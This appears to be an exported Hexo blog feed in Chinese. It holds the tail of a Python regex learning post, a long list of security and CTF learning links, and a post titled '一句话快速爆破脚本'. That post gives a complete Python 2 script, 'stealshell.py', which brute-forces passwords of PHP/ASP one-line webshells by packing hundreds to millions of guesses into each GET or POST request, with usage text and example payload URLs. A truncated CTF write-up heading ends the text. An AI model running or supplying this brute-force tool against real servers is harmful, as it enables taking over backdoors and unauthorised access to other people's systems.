class="string">感染弓形虫有助于生儿子——不过，不知道是需要在感染状态才行，还是治好了也行。 ”，</span></span><br><span class="line"><span class="string">可以看到风格很早就形成了，幽默感，批判性，科学性具存，这就是让人乐于追随学习的地方。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h3 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h3><ul><li>了解了正则表达式的<code>backreference</code>和<code>lazy mode</code> 。</li><li>使用 <code>json.load(file)</code> 将json文件转换成字典。</li><li>数据编码问题可能导致写文件报错，可用<code>f.write(data.encode(&#39;utf8&#39;))</code> 。</li><li>用<code>with open(&quot;f1&quot;) as f1,open(&quot;f2&quot;) as f2:</code> 打开多个文件。</li><li>每一个人作为数字公民的部分可能最后并不能留下太多痕迹，而且这些痕迹可能非常脆弱。当然，话说回来，这同线下生活也是相似的。</li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>网络安全学习资料</title>
      <link href="/180308NewbieSecurityList/"/>
      <url>/180308NewbieSecurityList/</url>
      
        <content type="html"><![CDATA[<blockquote><p> 项目地址在 Github：<a href="https://github.com/findneo/Newbie-Security-List" target="_blank" rel="noopener">https://github.com/findneo/Newbie-Security-List</a> </p></blockquote><h1 id="Newbie-Security-List"><a href="#Newbie-Security-List" class="headerlink" title="Newbie-Security-List"></a><strong><em>Newbie</em>-Security-List</strong></h1><blockquote><p>一桌菜，十几盘，有荤有素，有凉有热，怎么吃呢？你可以找一盘看起来好吃的，也可以找一盘离自己近的，都行。但是，得动筷子。不管怎么吃，最重要的是得动筷子。学技术也是一样。</p><p>有的人死活不动筷子，还不断念叨：“我要开始吃了。我马上就要开始吃了。我只要开始吃就能吃饱。我吃饱了就不饿了。你能不能告诉我该先吃哪一盘？先冷盘后热菜再喝汤这样是不是最好？但是我听说广东人都是先喝汤？这盘菜会不会太远了？这盘会不会太油腻？我吃饱了万一想拉屎你们这里有厕所吗？我真的马上就要开始吃了……为什么我现在还是饿？你能不能帮帮我？”</p><p>by <a href="https://m.weibo.cn/status/4179050593969473" target="_blank" rel="noopener">tombkeeper</a> @2017-11-28</p></blockquote><h1 id="乌云"><a href="#乌云" class="headerlink" title="乌云"></a>乌云</h1><h2 id="在线漏洞库-知识库"><a href="#在线漏洞库-知识库" class="headerlink" title="在线漏洞库/知识库"></a>在线漏洞库/知识库</h2><ul><li><a href="https://wooyun.shuimugan.com/" target="_blank" rel="noopener">https://wooyun.shuimugan.com/</a></li><li><a href="http://cb.drops.wiki/" target="_blank" rel="noopener">http://cb.drops.wiki/</a></li><li><a href="http://wooyun.chamd5.org/" target="_blank" rel="noopener">http://wooyun.chamd5.org/</a></li><li><a href="http://wooyun.jozxing.cc/" target="_blank" rel="noopener">http://wooyun.jozxing.cc/</a></li><li><a href="https://web.archive.org/web/20160628133257/http://www.wooyun.org:80/" target="_blank" rel="noopener">https://web.archive.org/web/20160628133257/http://www.wooyun.org:80/</a> （<del>GFW</del>）</li></ul><h2 id="在线知识库"><a href="#在线知识库" class="headerlink" title="在线知识库"></a>在线知识库</h2><ul><li><a href="https://superkieran.github.io/WooyunDrops/#!/" target="_blank" rel="noopener">https://superkieran.github.io/WooyunDrops/#!/</a></li><li><a href="https://wooyun.js.org/" target="_blank" rel="noopener">https://wooyun.js.org/</a></li><li><a href="https://web.archive.org/web/20160628084846/http://drops.wooyun.org:80/" target="_blank" rel="noopener">https://web.archive.org/web/20160628084846/http://drops.wooyun.org:80/</a> （<del>GFW</del>）</li></ul><h2 id="在线漏洞库"><a href="#在线漏洞库" class="headerlink" title="在线漏洞库"></a>在线漏洞库</h2><ul><li><a href="http://bug.p0sec.net/" target="_blank" rel="noopener">http://bug.p0sec.net/</a></li><li><a href="https://web.archive.org/web/20160625075226/http://www.wooyun.org:80/bugs" target="_blank" rel="noopener">https://web.archive.org/web/20160625075226/http://www.wooyun.org:80/bugs</a> （<del>GFW</del>）</li></ul><h2 id="本地搭建"><a href="#本地搭建" class="headerlink" title="本地搭建"></a>本地搭建</h2><h3 id="B-S型"><a href="#B-S型" class="headerlink" title="B/S型"></a>B/S型</h3><p><a href="https://github.com/hanc00l/wooyun_public" target="_blank" rel="noopener">https://github.com/hanc00l/wooyun_public</a></p><h3 id="硬盘搜索型"><a href="#硬盘搜索型" class="headerlink" title="硬盘搜索型"></a>硬盘搜索型</h3><ul><li>链接: <a href="https://pan.baidu.com/s/1Y0qPKDrU6uoiuAX-Ihuj4w" target="_blank" rel="noopener">WooYun漏洞、知识库收集(超详细版)</a> 密码: 28gr</li></ul><ul><li>everything : search file by name on disk.</li><li>agentransack/FileLocatorPro : search file by content on disk。</li></ul><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="BREAK-amp-WATCH"><a href="#BREAK-amp-WATCH" class="headerlink" title="BREAK &amp; WATCH"></a>BREAK &amp; WATCH</h2><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><ul><li><a href="https://beginners.re/" target="_blank" rel="noopener">https://beginners.re/</a></li><li><a href="https://leanpub.com/web-hacking-101" target="_blank" rel="noopener">https://leanpub.com/web-hacking-101</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/index.html" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/index.html</a></li><li><a href="https://www.pediy.com/kssd/" target="_blank" rel="noopener">https://www.pediy.com/kssd/</a></li><li><a href="https://paper.seebug.org/" target="_blank" rel="noopener">https://paper.seebug.org/</a></li><li><a href="http://evilcos.me/security_skill_tree_basic/index.html" target="_blank" rel="noopener">http://evilcos.me/security_skill_tree_basic/index.html</a></li><li><a href="https://book.nmask.cn/" target="_blank" rel="noopener">https://book.nmask.cn/</a></li></ul><h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h3><ul><li><a href="https://github.com/jekil/awesome-hacking/" target="_blank" rel="noopener">https://github.com/jekil/awesome-hacking/</a></li><li><a href="https://github.com/ctfs/" target="_blank" rel="noopener">https://github.com/ctfs/</a></li><li><a href="https://github.com/joe-shenouda/awesome-cyber-skills" target="_blank" rel="noopener">https://github.com/joe-shenouda/awesome-cyber-skills</a></li><li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="noopener">https://github.com/CHYbeta/Web-Security-Learning</a></li><li><a href="https://github.com/tom0li/collection-document" target="_blank" rel="noopener">https://github.com/tom0li/collection-document</a></li></ul><h3 id="安全导航"><a href="#安全导航" class="headerlink" title="安全导航"></a>安全导航</h3><ul><li><a href="https://navisec.it/" target="_blank" rel="noopener">https://navisec.it/</a></li><li><a href="http://www.itxueke.com/SecNavi/" target="_blank" rel="noopener">http://www.itxueke.com/SecNavi/</a></li><li><a href="http://shentoushi.top/" target="_blank" rel="noopener">http://shentoushi.top/</a></li><li><a href="http://secnav.dropsec.xyz/" target="_blank" rel="noopener">http://secnav.dropsec.xyz/</a></li></ul><h3 id="其他优秀资源"><a href="#其他优秀资源" class="headerlink" title="其他优秀资源"></a>其他优秀资源</h3><ul><li><a href="https://speakerdeck.com/search?utf8=%E2%9C%93&amp;q=ctf" target="_blank" rel="noopener">https://speakerdeck.com/search?utf8=%E2%9C%93&amp;q=ctf</a></li><li><a href="https://gotyour.pw/" target="_blank" rel="noopener">https://gotyour.pw/</a></li><li><a href="https://skills.bugbank.cn/" target="_blank" rel="noopener">https://skills.bugbank.cn/</a></li><li><a href="https://hackmethod.com/roadmap/" target="_blank" rel="noopener">https://hackmethod.com/roadmap/</a></li><li><a href="https://highon.coffee/" target="_blank" rel="noopener">https://highon.coffee/</a></li><li><a href="https://silic.wiki/doku.php" target="_blank" rel="noopener">https://silic.wiki/doku.php</a></li><li><a href="https://learnxinyminutes.com/" target="_blank" rel="noopener">https://learnxinyminutes.com/</a></li><li><a href="http://www.opensecuritytraining.info/" target="_blank" rel="noopener">http://www.opensecuritytraining.info/</a></li><li><a href="http://www.fuzzysecurity.com/index.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/index.html</a></li><li><a href="https://pentesterlab.com/bootcamp" target="_blank" rel="noopener">https://pentesterlab.com/bootcamp</a></li><li><a href="http://liveoverflow.com/" target="_blank" rel="noopener">http://liveoverflow.com/</a></li></ul><h2 id="GET-HANDS-DIRTY"><a href="#GET-HANDS-DIRTY" class="headerlink" title="GET HANDS DIRTY"></a>GET HANDS DIRTY</h2><h3 id="练习平台"><a href="#练习平台" class="headerlink" title="练习平台"></a>练习平台</h3><ul><li><a href="http://shell-storm.org/repo/CTF/" target="_blank" rel="noopener">http://shell-storm.org/repo/CTF/</a></li><li><a href="https://ctftime.org/" target="_blank" rel="noopener">https://ctftime.org/</a></li><li><a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com/</a></li><li><a href="https://exploit-exercises.com/" target="_blank" rel="noopener">https://exploit-exercises.com/</a></li><li><a href="http://cryptopals.com/" target="_blank" rel="noopener">http://cryptopals.com/</a></li><li><a href="http://overthewire.org/" target="_blank" rel="noopener">http://overthewire.org</a></li><li><a href="https://pwnhub.cn/index" target="_blank" rel="noopener">https://pwnhub.cn/index</a></li><li><a href="https://cmdchallenge.com/" target="_blank" rel="noopener">https://cmdchallenge.com/</a></li><li><a href="https://www.hackthissite.org/" target="_blank" rel="noopener">https://www.hackthissite.org/</a></li><li><a href="https://microcorruption.com/login" target="_blank" rel="noopener">https://microcorruption.com/login</a></li><li><a href="http://smashthestack.org/" target="_blank" rel="noopener">http://smashthestack.org/</a></li><li><a href="http://pwnable.kr/" target="_blank" rel="noopener">http://pwnable.kr/</a></li><li><a href="https://pwnable.tw/" target="_blank" rel="noopener">https://pwnable.tw/</a></li><li><a href="http://www.underthewire.tech/" target="_blank" rel="noopener">http://www.underthewire.tech/</a></li><li><a href="http://www.freebuf.com/sectool/4708.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/4708.html</a></li><li><a href="http://www.hetianlab.com/" target="_blank" rel="noopener">http://www.hetianlab.com/</a></li></ul><h3 id="ONLINE-JUDGE"><a href="#ONLINE-JUDGE" class="headerlink" title="ONLINE JUDGE"></a>ONLINE JUDGE</h3><ul><li><a href="https://ringzer0team.com/" target="_blank" rel="noopener">https://ringzer0team.com/</a></li><li><a href="https://www.wechall.net/" target="_blank" rel="noopener">https://www.wechall.net/</a></li><li><a href="https://backdoor.sdslabs.co/challenges" target="_blank" rel="noopener">https://backdoor.sdslabs.co/challenges</a></li><li><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">https://www.jarvisoj.com/</a></li><li><a href="https://ctf.katsudon.org/ctf4u/" target="_blank" rel="noopener">https://ctf.katsudon.org/ctf4u/</a></li><li><a href="https://www.onlinectf.com/challenges/" target="_blank" rel="noopener">https://www.onlinectf.com/challenges/</a></li><li><a href="http://ksnctf.sweetduet.info/" target="_blank" rel="noopener">http://ksnctf.sweetduet.info/</a></li><li><a href="http://ctf.nuptsast.com/" target="_blank" rel="noopener">http://ctf.nuptsast.com/</a></li><li><a href="https://ctf.hackmethod.com/" target="_blank" rel="noopener">https://ctf.hackmethod.com/</a></li><li><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">http://oj.xctf.org.cn/</a></li><li><a href="http://ctf.bugku.com/" target="_blank" rel="noopener">http://ctf.bugku.com/</a></li><li><a href="http://ctf.rookiehacker.org/" target="_blank" rel="noopener">http://ctf.rookiehacker.org/</a></li><li><a href="http://www.shiyanbar.com/ctf/practice" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/practice</a></li><li><a href="http://hackinglab.cn/" target="_blank" rel="noopener">http://hackinglab.cn/</a></li><li><a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">https://hackme.inndy.tw/</a></li><li><a href="https://ctflearn.com/" target="_blank" rel="noopener">https://ctflearn.com/</a></li><li><a href="https://ctf.katsudon.org/" target="_blank" rel="noopener">https://ctf.katsudon.org/</a></li></ul><h3 id="FOR-FUN"><a href="#FOR-FUN" class="headerlink" title="FOR FUN"></a>FOR FUN</h3><ul><li><a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex00/</a></li><li><a href="http://web.onlinectf.com/cutezombie/web-app/" target="_blank" rel="noopener">http://web.onlinectf.com/cutezombie/web-app/</a></li><li><a href="http://riddle.arthurluk.net/pocket.php" target="_blank" rel="noopener">http://riddle.arthurluk.net/pocket.php</a></li><li><a href="http://fun.coolshell.cn/" target="_blank" rel="noopener">http://fun.coolshell.cn/</a></li><li><a href="http://monyer.com/game/game1/" target="_blank" rel="noopener">http://monyer.com/game/game1/</a></li></ul><h1 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h1><h2 id="HACKERS"><a href="#HACKERS" class="headerlink" title="HACKERS"></a>HACKERS</h2><ul><li><a href="https://whereisk0shl.top/" target="_blank" rel="noopener">https://whereisk0shl.top/</a></li><li><a href="https://www.leavesongs.com/" target="_blank" rel="noopener">https://www.leavesongs.com/</a></li><li><a href="http://www.cnblogs.com/iamstudy" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy</a></li><li><a href="https://sigterm.ch/" target="_blank" rel="noopener">https://sigterm.ch/</a></li><li><a href="http://xlab.tencent.com/cn/" target="_blank" rel="noopener">http://xlab.tencent.com/cn/</a></li><li><a href="https://strcpy.me/" target="_blank" rel="noopener">https://strcpy.me/</a></li><li><a href="https://ricterz.me/" target="_blank" rel="noopener">https://ricterz.me/</a></li><li><a href="http://www.blue-lotus.net/" target="_blank" rel="noopener">http://www.blue-lotus.net/</a></li><li><a href="http://217.logdown.com/" target="_blank" rel="noopener">http://217.logdown.com/</a></li><li><a href="http://sh3ll.me/" target="_blank" rel="noopener">http://sh3ll.me/</a></li><li><a href="http://jiangjiawei.pw/blog/" target="_blank" rel="noopener">http://jiangjiawei.pw/blog/</a></li><li><a href="https://dog.xmu.edu.cn/" target="_blank" rel="noopener">https://dog.xmu.edu.cn/</a></li><li><a href="https://chybeta.github.io/" target="_blank" rel="noopener">https://chybeta.github.io/</a></li><li><a href="https://hackfun.org/" target="_blank" rel="noopener">https://hackfun.org/</a></li><li><a href="http://www.cnblogs.com/figure9/" target="_blank" rel="noopener">http://www.cnblogs.com/figure9/</a></li><li><a href="http://blog.csdn.net/v_july_v" target="_blank" rel="noopener">http://blog.csdn.net/v_july_v</a></li><li><a href="http://mslc.ctf.su/" target="_blank" rel="noopener">http://mslc.ctf.su/</a></li></ul><h2 id="MIND-HACKERS"><a href="#MIND-HACKERS" class="headerlink" title="MIND HACKERS"></a>MIND HACKERS</h2><ul><li><a href="https://livid.v2ex.com/" target="_blank" rel="noopener">https://livid.v2ex.com/</a></li><li><a href="https://www.byvoid.com/zhs/" target="_blank" rel="noopener">https://www.byvoid.com/zhs/</a></li><li><a href="http://mindhacks.cn/" target="_blank" rel="noopener">http://mindhacks.cn/</a></li><li><a href="http://www.matrix67.com/blog/" target="_blank" rel="noopener">http://www.matrix67.com/blog/</a></li><li><a href="http://www.ruanyifeng.com/home.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/home.html</a></li><li><a href="http://www.yinwang.org/" target="_blank" rel="noopener">http://www.yinwang.org/</a></li><li><a href="https://www.scotthyoung.com/blog/" target="_blank" rel="noopener">https://www.scotthyoung.com/blog/</a></li><li><a href="https://blog.youxu.info/" target="_blank" rel="noopener">https://blog.youxu.info/</a></li><li><a href="https://program-think.blogspot.com/" target="_blank" rel="noopener">https://program-think.blogspot.com/</a></li></ul><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><ul><li><a href="https://google.com/" target="_blank" rel="noopener">https://google.com/</a></li><li><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a></li><li><a href="http://search.chongbuluo.com/" target="_blank" rel="noopener">http://search.chongbuluo.com/</a></li><li><a href="http://www.xilinjie.com/" target="_blank" rel="noopener">http://www.xilinjie.com/</a></li><li><a href="http://webcache.googleusercontent.com/search?q=cache:https://findneo.github.io" target="_blank" rel="noopener">http://webcache.googleusercontent.com/search?q=cache:https://findneo.github.io</a></li><li><a href="https://web.archive.org/web/*/https://findneo.github.io" target="_blank" rel="noopener">https://web.archive.org/web/*/https://findneo.github.io</a></li></ul><h3 id="电子书籍"><a href="#电子书籍" class="headerlink" title="电子书籍"></a>电子书籍</h3><ul><li><a href="http://www.banshujiang.cn/" target="_blank" rel="noopener">http://www.banshujiang.cn/</a></li><li><a href="http://bestcbooks.com/" target="_blank" rel="noopener">http://bestcbooks.com/</a></li><li><a href="https://salttiger.com/archives/" target="_blank" rel="noopener">https://salttiger.com/archives/</a></li><li><a href="https://www.it-ebooks.info/" target="_blank" rel="noopener">https://www.it-ebooks.info/</a></li><li><a href="http://www.oreilly.com/programming/free/" target="_blank" rel="noopener">http://www.oreilly.com/programming/free/</a></li><li><a href="http://www.sxyj.net/" target="_blank" rel="noopener">http://www.sxyj.net/</a></li><li><a href="https://www.jiumodiary.com/" target="_blank" rel="noopener">https://www.jiumodiary.com/</a></li></ul><h2 id="安全相关"><a href="#安全相关" class="headerlink" title="安全相关"></a>安全相关</h2><ul><li><a href="https://tools.pediy.com/" target="_blank" rel="noopener">https://tools.pediy.com/</a></li><li><a href="https://down.52pojie.cn/Tools/" target="_blank" rel="noopener">https://down.52pojie.cn/Tools/</a></li><li><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">https://www.ctftools.com/down/</a></li><li><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></li><li><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></li><li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li><li><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></li><li><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></li><li><a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a></li><li><a href="https://koczkatamas.github.io/" target="_blank" rel="noopener">https://koczkatamas.github.io/</a></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>一句话快速爆破脚本</title>
      <link href="/180304StealShell/"/>
      <url>/180304StealShell/</url>
      
        <content type="html"><![CDATA[<p>思路来自爱春秋文章<a href="https://bbs.ichunqiu.com/thread-16952-1-1.html" target="_blank" rel="noopener">python之提速千倍爆破一句话 </a> ，据说源头是吐司文章《让你的一句话爆破速度提升千倍》。</p><p>速度提升的关键在于一次尝试提交多个可能的密码，实测在Apache+PHP下使用POST方式请求可高达四千万条密码每次（耗时约20秒，GET方式请求只能达到两百条左右），效果可以说非常惊人，如果有一个足够好的字典，那将无往不利。</p><h3 id="思路举例"><a href="#思路举例" class="headerlink" title="思路举例"></a>思路举例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">慢速：</span><br><span class="line">http:<span class="comment">//127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22);</span></span><br><span class="line">快速：</span><br><span class="line">http:<span class="comment">//127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22);&amp;findneo=echo(%22pwd:findneo%22);</span></span><br></pre></td></tr></table></figure><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Usage: stealshell.py [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">        -h, --help                      display this message</span><br><span class="line">        -u URL, --url=URL               Target URL;This option must be provided to define the target</span><br><span class="line">                                                (e.g. <span class="string">"http://127.0.0.1/xiao.php"</span>)</span><br><span class="line">        -m METHOD                       request method (support GET/POST,GET <span class="keyword">is</span> default )</span><br><span class="line">        -d DICT                         the filename of candidate passwords (e.g. <span class="string">"shell_pass_dic.txt"</span>)</span><br><span class="line">        -n NUM                          the number of passwords that will be submitted <span class="keyword">in</span> each request</span><br><span class="line">                                                 (<span class="number">219</span> <span class="keyword">is</span> default)</span><br></pre></td></tr></table></figure><h3 id="依赖库"><a href="#依赖库" class="headerlink" title="依赖库"></a>依赖库</h3><p> python2.7: requests,sys,getopt</p><h3 id="效果如图"><a href="#效果如图" class="headerlink" title="效果如图"></a>效果如图</h3><p><img src="stealshell.png" alt="stealshell.png"></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>支持PHP和asp，asp部分没有搭环境测试，但只是payload简单替换，理论上是没有问题的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"></span><br><span class="line">token=<span class="string">"pwd"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"""</span></span><br><span class="line"><span class="string">###################################################################################################</span></span><br><span class="line"><span class="string">This is a script used to guess the pass of webshells rapidly (up to 40M each time).</span></span><br><span class="line"><span class="string">It supports php&amp;asp,GET&amp;POST.</span></span><br><span class="line"><span class="string">site:https://findneo.github.io/stealshell/</span></span><br><span class="line"><span class="string">###################################################################################################</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage: stealshell.py [options]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">-h, --helpdisplay this message</span></span><br><span class="line"><span class="string">-u URL, --url=URL Target URL;This option must be provided to define the target  </span></span><br><span class="line"><span class="string">(e.g. "http://127.0.0.1/xiao.php")</span></span><br><span class="line"><span class="string">-m METHOD request method (support GET/POST,GET is default )</span></span><br><span class="line"><span class="string">-d DICT the filename of candidate passwords (e.g. "shell_pass_dic.txt")</span></span><br><span class="line"><span class="string">-n NUM the number of passwords that will be submitted in each request</span></span><br><span class="line"><span class="string"> (219 is default)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dict</span><span class="params">(dic_name=<span class="string">"shell_pass_dic.txt"</span>,pcpt=<span class="number">4</span>,shell_type=<span class="string">"php"</span>)</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(dic_name,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">c=f.readlines()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nthis dict has %d items in all"</span>%len(c)</span><br><span class="line">cnt=len(c)/pcpt <span class="comment"># pcpt is short for password_check_per_time</span></span><br><span class="line">sp=[] <span class="comment"># split password by pcpt per group</span></span><br><span class="line">sp.extend([c[i*pcpt:i*pcpt+pcpt] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(cnt)])</span><br><span class="line">sp+=[c[cnt*pcpt:]]</span><br><span class="line"><span class="comment"># sp:   [['x\n', 'cmd\n', 'pass\n', 'pwd\n'], ['xiao\n', '584521\n', 'nohack\n', '45189946\n'], ...]</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"we split it into %d groups (%d * %d + %d) and submit one group each time\n"</span>%(len(sp),cnt,pcpt,len(c)-pcpt*cnt)</span><br><span class="line"></span><br><span class="line">spd=[]</span><br><span class="line">execute=<span class="string">"echo"</span> <span class="keyword">if</span> shell_type==<span class="string">"php"</span> <span class="keyword">else</span> <span class="string">"response.write"</span></span><br><span class="line">spd.extend([&#123;j.strip(<span class="string">'\n'</span>):<span class="string">"%s('%s:%s');"</span>%(execute,token,j) <span class="keyword">for</span> j <span class="keyword">in</span> i&#125;<span class="keyword">for</span> i <span class="keyword">in</span> sp])</span><br><span class="line"><span class="comment"># spd:  [&#123;'x': "echo('pwd:x\n');", 'pass': "echo('pwd:pass\n');",...]</span></span><br><span class="line"><span class="keyword">return</span> spd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_pass</span><span class="params">(url,pwd_list,method)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pwd_list:</span><br><span class="line">r=req.get(url,params=i) <span class="keyword">if</span> method==<span class="string">"GET"</span> <span class="keyword">else</span> req.post(url,data=i)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'.'</span>,</span><br><span class="line"><span class="keyword">if</span> token <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">print</span> <span class="string">""</span></span><br><span class="line"><span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">options,left_args=getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">"hu:m:d:n:"</span>,[<span class="string">"help"</span>,<span class="string">"url="</span>])</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1/xiao.php"</span></span><br><span class="line">method=<span class="string">"GET"</span></span><br><span class="line">dic_name=<span class="string">"shell_pass_dic.txt"</span></span><br><span class="line">pass_num=<span class="number">219</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> len(options):</span><br><span class="line">exit(usage())</span><br><span class="line"><span class="keyword">for</span> name,value <span class="keyword">in</span> options:</span><br><span class="line"><span class="keyword">if</span> name <span class="keyword">in</span> (<span class="string">"-h"</span>,<span class="string">"--help"</span>):</span><br><span class="line">exit(usage())</span><br><span class="line"><span class="keyword">elif</span> name <span class="keyword">in</span> (<span class="string">"-u"</span>,<span class="string">"--url"</span>):</span><br><span class="line">url=value</span><br><span class="line"><span class="keyword">elif</span> name <span class="keyword">in</span> (<span class="string">"-m"</span>):</span><br><span class="line">method=value</span><br><span class="line"><span class="keyword">elif</span> name <span class="keyword">in</span> (<span class="string">"-d"</span>):</span><br><span class="line">dic_name=value</span><br><span class="line"><span class="keyword">elif</span> name <span class="keyword">in</span> (<span class="string">"-n"</span>):</span><br><span class="line">pass_num=int(value)</span><br><span class="line"></span><br><span class="line">shell_type=url[<span class="number">-3</span>:]</span><br><span class="line">pwd_list=get_dict(dic_name=dic_name,pcpt=pass_num,shell_type=shell_type)</span><br><span class="line"><span class="keyword">print</span> check_pass(url=url,pwd_list=pwd_list,method=method)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>“华为杯”极客出发XMan冬令营线上CTF解题赛</title>
      <link href="/180107XmanCampOnlineWP/"/>
      <url>/180107XmanCampOnlineWP/</url>
      
